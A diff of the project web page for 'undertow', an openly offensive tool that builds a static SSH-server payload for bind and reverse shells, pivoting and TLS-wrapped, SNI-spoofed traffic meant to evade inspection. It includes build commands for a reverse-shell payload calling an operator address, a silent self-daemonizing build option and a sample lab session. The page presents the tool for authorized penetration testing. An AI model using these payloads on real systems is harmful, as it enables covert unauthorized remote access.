@@ -1,252 +1,184 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Undertow -- {{REPO_DESC_LONG}}">
-    <meta name="keywords" content="Undertow, plugin, Undertow, sub vault, productivity, knowledge management, note taking">
-    <title>Undertow -- Undertow Plugin</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="styles.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>undertow: static SSH server for bind and reverse shells with PTY and SFTP</title>
+<meta name="description" content="Static SSH server for bind and reverse shells with PTY and SFTP">
+<link rel="canonical" href="https://real-fruit-snacks.github.io/Undertow/">
+<meta property="og:title" content="undertow">
+<meta property="og:description" content="Static SSH server for bind and reverse shells with PTY and SFTP">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://real-fruit-snacks.github.io/Undertow/">
+<meta property="og:image" content="https://real-fruit-snacks.github.io/Undertow/assets/cover-dark.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="560">
+<meta property="og:image:alt" content="undertow: a tuned static binary on the target becomes a PTY shell for the operator's plain ssh client">
+<meta name="twitter:card" content="summary_large_image">
+<link rel="icon" href="favicon.ico" sizes="32x32">
+<link rel="icon" href="icon.svg" type="image/svg+xml">
+<link rel="apple-touch-icon" href="apple-touch-icon.png">
+<link rel="manifest" href="manifest.webmanifest">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#050507">
+<link rel="preload" href="fonts/big-shoulders-stencil-latin.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="fonts/azeret-mono-latin.woff2" as="font" type="font/woff2" crossorigin>
+<script>
+    // Dark (LX 263) default; opt-in light (LX 512) synced via rfs-theme across RFS pages.
+    (function (d) {
+        try {
+            var t = localStorage.getItem('rfs-theme');
+            if (t === 'light' || t === 'dayshift') d.dataset.theme = 'light';
+        } catch (e) {}
+        if (window.matchMedia && matchMedia('(prefers-reduced-motion: no-preference)').matches) d.classList.add('js-run');
+    })(document.documentElement);
+</script>
+<link rel="stylesheet" href="rfs.css">
+<link rel="stylesheet" href="rfs-components.css">
+<link rel="stylesheet" href="styles.css">
 </head>
-<body>
+<body class="rfs-shell is-tow">
+<a class="rfs-skip" href="#build">Skip to the build line</a>
 
-    <!-- ==================== NAV ==================== -->
-    <nav class="nav" id="nav">
-        <div class="nav-inner">
-            <a href="#" class="nav-logo">
-                <svg class="nav-logo-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path><line x1="12" y1="11" x2="12" y2="17"></line><line x1="9" y1="14" x2="15" y2="14"></line></svg>
-                Undertow
-            </a>
-            <div class="nav-links">
-                <a href="#features">Features</a>
-                <a href="#how-it-works">How It Works</a>
-                <a href="#install">Install</a>
-                <a href="{{GITHUB_URL}}" class="nav-github" target="_blank" rel="noopener">
-                    <svg viewBox="0 0 24 24" fill="currentColor" width="20" height="20"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
-                </a>
-            </div>
+<header class="rfs-shell-header top">
+    <div class="wrap top-inner">
+        <a class="brand" href="https://real-fruit-snacks.github.io/">
+            <img class="brand-tile" src="icon.svg" alt="" width="28" height="28">
+            <span class="brand-text">UNDERTOW</span>
+        </a>
+        <nav class="top-nav" aria-label="Links">
+            <a href="#what">What's in it</a>
+            <a href="#tested">Tested on</a>
+            <a href="#issues">Known issues</a>
+            <a href="https://github.com/Real-Fruit-Snacks/Undertow">GitHub</a>
+        </nav>
+        <button class="theme-btn" type="button" id="theme" aria-pressed="false" aria-label="Switch to LX 512 light theme">
+            <span class="theme-dot" aria-hidden="true"></span>
+            <span class="t-dark">LX 263 DARK</span>
+            <span class="t-light">LX 512 LIGHT</span>
+        </button>
+    </div>
+</header>
+
+<div class="rfs-scroll-region page-scroll" id="page-scroll">
+<main class="wrap stack">
+<section class="card first" aria-labelledby="top-h">
+    <p class="runhead"><b>undertow 1.3.0</b><span>Windows · Linux · macOS</span><span>Go, one static binary</span><span>GPLv3</span></p>
+    <div class="hero">
+        <div>
+            <h1 class="title" id="top-h">undertow</h1>
+            <p class="lead">Static SSH server for bind and reverse shells with PTY and SFTP</p>
+            <p class="sub">I wanted a tiny way to get a good reverse shell and a pivot without juggling listeners and tunnel syntax by hand. undertow is that errand as one static binary: credentials and connection details are baked in at build time, the target runs it, and a plain <code>ssh</code> client gets a full PTY, SFTP file transfer and all three kinds of port forwarding. Optional TLS wrapping hides the SSH banner inside what looks like HTTPS. It assumes you have written authorization for the target. undertow is the preservation fork of Ferdinor's undertow (2021), whose upstream repository is no longer public — same GPLv3, modernized and maintained. For authorized security testing only.</p>
+            <ol class="ck steps" id="errand-ck" aria-label="The errand, start to finish">
+                <li id="build" data-state="todo"><span class="box" aria-hidden="true"></span><span class="ch">Build</span><span class="ld" aria-hidden="true"></span><span class="rs">Tuned binary</span>
+                    <div class="act"><div class="cmd"><code>./build.sh reverse 10.10.14.5:4444</code><button class="copy" type="button" data-copy="./build.sh reverse 10.10.14.5:4444">Copy</button></div>
+                    <div class="cmd"><code>./build.sh listen 8888</code><button class="copy" type="button" data-copy="./build.sh listen 8888">Copy</button></div></div>
+                    <p class="why">Needs Go and Make on the build box. The script cross-compiles Linux and Windows binaries with a fresh random password baked in, and writes a handler script for reverse mode. <code>--tls --sni login.microsoft.com</code> wraps the traffic, <code>--nocli --daemonize</code> bakes a silent self-backgrounding payload.</p></li>
+                <li data-step="2" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Handler</span><span class="ld" aria-hidden="true"></span><span class="rs">Listening</span></li>
+                <li data-step="3" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Deliver</span><span class="ld" aria-hidden="true"></span><span class="rs">Executed</span></li>
+                <li data-step="4" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Callback</span><span class="ld" aria-hidden="true"></span><span class="rs">Received</span></li>
+                <li data-step="5" data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Session</span><span class="ld" aria-hidden="true"></span><span class="rs">PTY</span></li>
+            </ol>
+            <p class="closeout">One ssh client, full session</p>
         </div>
-    </nav>
 
-    <!-- ==================== HERO ==================== -->
-    <section class="hero">
-        <div class="hero-glow hero-glow--1"></div>
-        <div class="hero-glow hero-glow--2"></div>
-        <div class="hero-grid"></div>
+        <figure class="display" aria-labelledby="session-cap">
+            <div class="screenbox">
+                <p class="bar" aria-hidden="true"><b>A lab run</b><span>zsh · kali</span></p>
+<pre class="screen" id="screen" tabindex="0" aria-label="An undertow run: build a tuned binary, start the handler, catch the callback, ssh in"><code><span class="ln"><span class="p">$</span> <span class="t">./build.sh reverse 10.10.14.5:4444</span></span>
+<span class="ln o">[i] Mode:     reverse</span>
+<span class="ln o">[i] Target:   svc@10.10.14.5:4444</span>
+<span class="ln o">[i] BindPort: random (allocated by SSH server)</span>
+<span class="ln" data-step="2"><span class="s">[ok]</span> Build completed!</span>
+<span class="ln a">[!] Password: 9f2c71aa4b03d1e2</span>
 
-        <div class="hero-content">
-            <div class="hero-badge">Open Source &middot; MIT License</div>
-            <h1 class="hero-title">
-                Statically-linked SSH server.
-            </h1>
-            <p class="hero-subtitle">
-                An undertow is a current flowing beneath the surface in the opposite direction from what's visible above. Felt fitting for a tool that hides SSH traffic inside TLS — appearing as HTTPS on the wire while the session flows underneath.
-            </p>
-            <div class="hero-actions">
-                <a href="https://github.com/Real-Fruit-Snacks/Undertow/releases/latest" class="btn btn--primary">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="18" height="18"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-                    Download
-                </a>
-                <a href="{{GITHUB_URL}}" class="btn btn--ghost" target="_blank" rel="noopener">
-                    View on GitHub
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="16" height="16"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg>
-                </a>
+<span class="ln"><span class="p">$</span> <span class="t">./bin/handler-10-10-14-5-4444</span></span>
+<span class="ln o">[i] Listening on port:  4444</span>
+<span class="ln o">[i] Expecting callback: 10.10.14.5</span>
+<span class="ln" data-step="3"><span class="s">[ok]</span> listening on 0.0.0.0:4444</span>
+<span class="ln o">··· undertow.exe runs on the target ···</span>
+<span class="ln" data-step="4"><span class="s">[ok]</span> New connection from 10.10.11.23: svc on web01 reachable via 127.0.0.1:4444</span>
+
+<span class="ln"><span class="p">$</span> <span class="t">ssh -p 4444 svc@127.0.0.1</span></span>
+<span class="ln o">svc@127.0.0.1's password:</span>
+<span class="ln" data-step="5"><span class="q">svc@web01:~$</span> <span class="t">id</span></span>
+<span class="ln o">uid=1000(svc) gid=1000(svc) groups=1000(svc),27(sudo)</span>
+
+<span class="ln end"><span class="p">$</span> <span class="cursor"></span></span></code></pre>
             </div>
-        </div>
+            <figcaption id="session-cap">
+                <p class="cap">A scripted run against a throwaway lab target. The password is baked into the binary at build time and printed by the build script; the callback line is the handler's own output once the target connects, and the <code>ssh</code> session is a stock client — nothing to install on the operator side.</p>
+                <button class="replay" type="button" data-replay="screen" hidden>Replay</button>
+            </figcaption>
+        </figure>
+    </div>
+</section>
 
-        <!-- Floating mock UI cards -->
-        <div class="hero-visual">
-            <div class="mock-window">
-                <div class="mock-titlebar">
-                    <span class="mock-dot mock-dot--red"></span>
-                    <span class="mock-dot mock-dot--yellow"></span>
-                    <span class="mock-dot mock-dot--green"></span>
-                    <span class="mock-titlebar-text">Undertow</span>
-                </div>
-                <div class="mock-body">
-                    <div class="mock-sidebar">
-                        <div class="mock-folder mock-folder--active">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="14" height="14"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
-                            My Project
-                        </div>
-                        <div class="mock-file mock-file--nested">research-notes.md</div>
-                        <div class="mock-file mock-file--nested">architecture.md</div>
-                        <div class="mock-file mock-file--nested">todo.md</div>
-                        <div class="mock-folder mock-folder--hidden">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="14" height="14"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
-                            Other Work
-                        </div>
-                        <div class="mock-folder mock-folder--hidden">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="14" height="14"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
-                            Archive
-                        </div>
-                    </div>
-                    <div class="mock-editor">
-                        <div class="mock-editor-line mock-editor-line--heading"># Architecture</div>
-                        <div class="mock-editor-line">The system uses a modular</div>
-                        <div class="mock-editor-line">approach to separate core</div>
-                        <div class="mock-editor-line">logic from the UI layer.</div>
-                        <div class="mock-editor-line mock-editor-line--empty"></div>
-                        <div class="mock-editor-line mock-editor-line--tag">#design #system</div>
-                    </div>
-                </div>
-                <div class="mock-statusbar">
-                    <span class="mock-statusbar-vault">Sub-vault: My Project</span>
-                </div>
-            </div>
-        </div>
-    </section>
+<section class="card ref" id="what" aria-labelledby="what-h">
+    <h2 id="what-h">What's in it</h2>
+    <p class="intro">One binary covers both directions. Every status line starts with a bracketed tag — <code>[ok]</code>, <code>[!]</code>, <code>[x]</code>, <code>[i]</code> — so output stays meaningful piped or with <code>NO_COLOR</code> set.</p>
+    <div class="cols">
+        <ul class="ck spec">
+            <li><span class="ch">Reverse shells</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>reverse</code></span>
+                <p class="why">The binary dials home through egress firewalls and asks your undertow listener for a bind port — random by default, pinned with <code>-b</code>. The auto-generated handler script starts the listener, shows the password, and prints the exact <code>ssh</code> command when the callback lands.</p></li>
+            <li><span class="ch">Bind shells</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>listen</code></span>
+                <p class="why">The binary listens on the target and you SSH straight to it. Same session features as reverse mode, nothing else to run.</p></li>
+            <li><span class="ch">Full PTY</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>pty</code></span>
+                <p class="why">openpty on Linux, ConPTY on Windows 10 17763 and later — tab completion, job control and full-screen tools work. Older Windows can fall back to an <code>ssh-shellhost.exe</code> path via <code>-s</code>.</p></li>
+            <li><span class="ch">SFTP</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>sftp</code></span>
+                <p class="why">A built-in subsystem on the same connection: <code>sftp -P 4444 svc@127.0.0.1</code> moves files without opening another channel or dropping tools on the target.</p></li>
+        </ul>
+        <ul class="ck spec">
+            <li><span class="ch">Port forwarding</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>-L -R -D</code></span>
+                <p class="why">Local, remote and dynamic (SOCKS) forwarding through the stock ssh client — the session doubles as the pivot, which is the other half of why the tool exists.</p></li>
+            <li><span class="ch">TLS wrapping</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>--tls</code></span>
+                <p class="why">Wraps SSH inside TLS with ALPN (<code>h2</code>, <code>http/1.1</code>) and a spoofed SNI (<code>--sni</code>, default <code>www.microsoft.com</code>), so the SSH banner never crosses the wire in plaintext. The certificate is self-signed at runtime — this is for DPI evasion, not authentication.</p></li>
+            <li><span class="ch">Baked builds</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>--nocli</code></span>
+                <p class="why">Every knob — password, pubkey, shell, user, host, ports, TLS, daemonize — is an ldflags variable baked at build time. A <code>--nocli --daemonize</code> build has no flags to fumble on delivery and backgrounds itself on launch.</p></li>
+            <li><span class="ch">Two ways in</span><span class="ld" aria-hidden="true"></span><span class="rs"><code>auth</code></span>
+                <p class="why">Password (constant-time comparison) or an ED25519 authorized key baked with <code>-k</code>. Passwords are random per build unless pinned with <code>-p</code>.</p></li>
+        </ul>
+    </div>
+</section>
 
-    <!-- ==================== FEATURES ==================== -->
-    <section class="features" id="features">
-        <div class="section-inner">
-            <div class="section-header">
-                <p class="section-label">Features</p>
-                <h2 class="section-title">Silent. Static. Secure.</h2>
-            </div>
+<section class="card ref" id="tested" aria-labelledby="tested-h">
+    <h2 id="tested-h">Tested on</h2>
+    <p class="intro">Every check below runs on every commit; the pipeline is public in the repo. What hasn't been run says so.</p>
+    <div class="cols">
+        <ul class="ck" aria-label="Checks run">
+            <li data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Build host: Windows 11, Go 1.27</span><span class="ld" aria-hidden="true"></span><span class="rs">Passed</span>
+                <p class="why">gofmt, <code>go vet</code> and a clean <code>CGO_ENABLED=0</code> build for all six targets before every merge.</p></li>
+            <li data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">CI cross-compile matrix</span><span class="ld" aria-hidden="true"></span><span class="rs">Passed</span>
+                <p class="why">ubuntu-24.04, windows-2022 and macos-latest each build amd64 and arm64 on every commit, so the six release binaries can never drift from the tree.</p></li>
+        </ul>
+        <ul class="ck" aria-label="More checks">
+            <li data-state="done"><span class="box" aria-hidden="true"></span><span class="ch">Windows binary smoke run</span><span class="ld" aria-hidden="true"></span><span class="rs">Passed</span>
+                <p class="why">The built <code>undertow.exe</code> starts and prints its usage on the build host.</p></li>
+            <li data-state="open"><span class="box" aria-hidden="true"></span><span class="ch">macOS runtime</span><span class="ld" aria-hidden="true"></span><span class="rs">Not run</span>
+                <p class="why">Cross-compiled for aarch64 and x86_64 on every release, unsigned and untested; probably works, no promises. First run needs <code>xattr -d com.apple.quarantine</code> on the binary.</p></li>
+        </ul>
+    </div>
+</section>
 
-            <div class="features-grid">
-                <div class="feature-card" data-reveal>
-                    <div class="feature-icon">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
-                    </div>
-                    <h3>Full PTY & SFTP</h3>
-                    <p>Includes complete PTY capabilities (openpty on Linux, ConPTY on Windows) and a built-in SFTP subsystem for seamless file transfers.</p>
-                </div>
+<section class="card ref limits" id="issues" aria-labelledby="issues-h">
+    <h2 id="issues-h">Known issues</h2>
+    <ul class="plain">
+        <li>The dial-home side uses <code>InsecureIgnoreHostKey</code>: a payload can't pin a host key it has never seen. Verify the callback out of band — the handler shows the connecting address and the rs-info line names the user and host.</li>
+        <li>TLS wrapping presents a self-signed certificate generated at runtime. It hides the SSH banner from DPI; it does not authenticate the listener to the payload, and payload-to-handler traffic should be treated as resistant to inspection, not to a determined active interceptor.</li>
+        <li>Baked credentials live in the binary. Build per engagement, keep handler scripts (which print the password) to yourself — they are written <code>chmod 700</code> for a reason.</li>
+        <li>Windows builds before Windows 10 17763 have no ConPTY; interactive PTY there needs <code>-s ssh-shellhost.exe</code>, or append <code>cmd</code> to the ssh line for a non-PTY session.</li>
+        <li>Nothing is signed. The Windows SmartScreen and macOS Gatekeeper warnings on first run are expected; <code>SHA256SUMS.txt</code> comes from the same release as the binaries it checks.</li>
+    </ul>
+</section>
+</main>
 
-                <div class="feature-card" data-reveal>
-                    <div class="feature-icon">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                    </div>
-                    <h3>TLS Wrapping</h3>
-                    <p>Wraps SSH connections in TLS with ALPN negotiation and SNI spoofing, bypassing DPI/IDS by appearing as standard HTTPS traffic.</p>
-                </div>
+<footer class="wrap foot">
+    <p>GPLv3 — fork of Ferdinor's undertow (2021). For authorized security testing with explicit written permission only.</p>
+    <p><a href="https://github.com/Real-Fruit-Snacks/Undertow">Source</a> · <a href="https://github.com/Real-Fruit-Snacks/Undertow/blob/main/CHANGELOG.md">Changelog</a> · <a href="https://github.com/Real-Fruit-Snacks/Undertow/blob/main/SECURITY.md">Security</a> · <a href="https://real-fruit-snacks.github.io/">RFS</a></p>
+</footer>
+</div>
 
-                <div class="feature-card" data-reveal>
-                    <div class="feature-icon">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>
-                    </div>
-                    <h3>Single Binary</h3>
-                    <p>Built with Go (<code>CGO_ENABLED=0</code>), producing a sub-1.5MB statically-linked binary that requires absolutely zero runtime dependencies.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- ==================== HOW IT WORKS ==================== -->
-    <section class="how" id="how-it-works">
-        <div class="section-inner">
-            <div class="section-header">
-                <p class="section-label">Workflow</p>
-                <h2 class="section-title">Drop it, run it, SSH in.</h2>
-            </div>
-
-            <div class="steps-timeline">
-                <div class="step" data-reveal>
-                    <div class="step-marker">
-                        <span class="step-num">1</span>
-                        <div class="step-line"></div>
-                    </div>
-                    <div class="step-content">
-                        <h3>Build the Payload</h3>
-                        <p>Use the included build script to compile a bind or reverse shell with your target connection details and optional TLS/SNI configurations.</p>
-                    </div>
-                </div>
-
-                <div class="step" data-reveal>
-                    <div class="step-marker">
-                        <span class="step-num">2</span>
-                        <div class="step-line"></div>
-                    </div>
-                    <div class="step-content">
-                        <h3>Deploy to Target</h3>
-                        <p>Drop the statically-linked binary onto the target. Auto-daemonize detaches it from the shell, freeing the execution context instantly.</p>
-                    </div>
-                </div>
-
-                <div class="step" data-reveal>
-                    <div class="step-marker">
-                        <span class="step-num">3</span>
-                    </div>
-                    <div class="step-content">
-                        <h3>Start Handler</h3>
-                        <p>Run the auto-generated handler script on your end to catch reverse callbacks or SSH directly to the bind listener on the target.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- ==================== INSTALL ==================== -->
-    <section class="install" id="install">
-        <div class="section-inner">
-            <div class="section-header">
-                <p class="section-label">Get Started</p>
-                <h2 class="section-title">Build your payload.</h2>
-            </div>
-
-            <div class="install-grid">
-                <div class="install-card" style="grid-column: 1 / -1;" data-reveal>
-                    <div class="install-card-header">
-                        <h3>Build from source</h3>
-                    </div>
-                    <ol>
-                        <li>Requires Go 1.15+ and Make.</li>
-                        <li>Clone repository: <code>git clone https://github.com/Real-Fruit-Snacks/Undertow.git && cd Undertow</code></li>
-                        <li>Build reverse payload: <code>./build.sh reverse 192.168.1.10:4444</code></li>
-                        <li>Start the auto-generated handler: <code>./bin/handler-192-168-1-10-4444</code></li>
-                    </ol>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- ==================== FOOTER ==================== -->
-    <footer class="footer">
-        <div class="section-inner footer-inner">
-            <div class="footer-left">
-                <svg class="footer-logo-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="20" height="20"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/><line x1="12" y1="11" x2="12" y2="17"/><line x1="9" y1="14" x2="15" y2="14"/></svg>
-                <span>Undertow</span>
-            </div>
-            <p class="footer-copy">Open source under the GPLv3 License. Created by <a href="https://github.com/Real-Fruit-Snacks" target="_blank" rel="noopener">Real-Fruit-Snacks</a>.</p>
-        </div>
-    </footer>
-
-    <script>
-        // ---- Sticky nav ----
-        const nav = document.getElementById('nav');
-        window.addEventListener('scroll', () => {
-            nav.classList.toggle('nav--scrolled', window.scrollY > 40);
-        });
-
-        // ---- Scroll reveal ----
-        const revealEls = document.querySelectorAll('[data-reveal]');
-        const revealObserver = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.classList.add('revealed');
-                    revealObserver.unobserve(entry.target);
-                }
-            });
-        }, { threshold: 0.15 });
-        revealEls.forEach(el => revealObserver.observe(el));
-
-        // ---- Smooth anchor scroll ----
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                const target = document.querySelector(this.getAttribute('href'));
-                if (target) {
-                    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
-                }
-            });
-        });
-    </script>
+<div id="rfs-toast" class="rfs-toast is-ok" popover="manual" role="status" aria-live="polite"></div>
+<script src="script.js"></script>
 </body>
 </html>
-
-
-
